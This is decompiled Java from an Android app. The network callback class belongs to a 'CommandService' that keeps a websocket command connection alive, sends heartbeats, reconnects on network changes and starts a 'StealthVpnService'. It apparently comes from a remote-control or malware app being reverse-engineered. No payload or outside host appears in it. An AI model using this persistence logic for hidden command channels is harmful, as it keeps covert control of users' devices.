package com.base.template.services;

import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.Handler;
import androidx.work.SystemClock;
import androidx.work.impl.constraints.trackers.NetworkStateTracker24;
import androidx.work.impl.constraints.trackers.NetworkStateTrackerKt;
import com.base.template.network.WsPersistManager;
import kotlin.io.CloseableKt;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class CommandService$registerNetworkReceiver$cb$1 extends ConnectivityManager.NetworkCallback {
    public final /* synthetic */ int $r8$classId;
    public final /* synthetic */ Object this$0;

    public /* synthetic */ CommandService$registerNetworkReceiver$cb$1(int i, Object obj) {
        this.$r8$classId = i;
        this.this$0 = obj;
    }

    @Override // android.net.ConnectivityManager.NetworkCallback
    public void onAvailable(Network network) {
        switch (this.$r8$classId) {
            case 0:
                CommandService commandService = (CommandService) this.this$0;
                CommandService commandService2 = CommandService.instance;
                commandService.writeHeartbeat();
                synchronized (WsPersistManager.lock) {
                    WsPersistManager.rapidFailCount = 0;
                    WsPersistManager.reconnectDelay = 3000L;
                }
                if (!WsPersistManager.isConnected) {
                    CommandService commandService3 = (CommandService) this.this$0;
                    commandService3.handler.removeCallbacks(commandService3.wsSoftReconnectRunnable);
                    CommandService commandService4 = (CommandService) this.this$0;
                    commandService4.handler.postDelayed(commandService4.wsSoftReconnectRunnable, 3000L);
                }
                CommandService commandService5 = (CommandService) this.this$0;
                commandService5.handler.postDelayed(new CommandService$$ExternalSyntheticLambda3(commandService5, 7), 5000L);
                try {
                    StealthVpnService stealthVpnService = StealthVpnService.instance;
                    CloseableKt.startIfReady(((CommandService) this.this$0).getApplicationContext());
                    return;
                } catch (Exception unused) {
                    return;
                }
            default:
                super.onAvailable(network);
                return;
        }
    }

    @Override // android.net.ConnectivityManager.NetworkCallback
    public void onCapabilitiesChanged(Network network, NetworkCapabilities networkCapabilities) {
        switch (this.$r8$classId) {
            case 1:
                SystemClock systemClock = SystemClock.get();
                int i = NetworkStateTrackerKt.$r8$clinit;
                networkCapabilities.toString();
                systemClock.getClass();
                NetworkStateTracker24 networkStateTracker24 = (NetworkStateTracker24) this.this$0;
                networkStateTracker24.setState(NetworkStateTrackerKt.getActiveNetworkState(networkStateTracker24.connectivityManager));
                break;
            default:
                super.onCapabilitiesChanged(network, networkCapabilities);
                break;
        }
    }

    @Override // android.net.ConnectivityManager.NetworkCallback
    public final void onLost(Network network) {
        switch (this.$r8$classId) {
            case 0:
                CommandService commandService = (CommandService) this.this$0;
                CommandService commandService2 = CommandService.instance;
                commandService.writeHeartbeat();
                Handler handler = commandService.handler;
                CommandService$$ExternalSyntheticLambda3 commandService$$ExternalSyntheticLambda3 = commandService.wsReconnectRunnable;
                handler.removeCallbacks(commandService$$ExternalSyntheticLambda3);
                handler.postDelayed(commandService$$ExternalSyntheticLambda3, 5000L);
                break;
            default:
                SystemClock systemClock = SystemClock.get();
                int i = NetworkStateTrackerKt.$r8$clinit;
                systemClock.getClass();
                NetworkStateTracker24 networkStateTracker24 = (NetworkStateTracker24) this.this$0;
                networkStateTracker24.setState(NetworkStateTrackerKt.getActiveNetworkState(networkStateTracker24.connectivityManager));
                break;
        }
    }
}
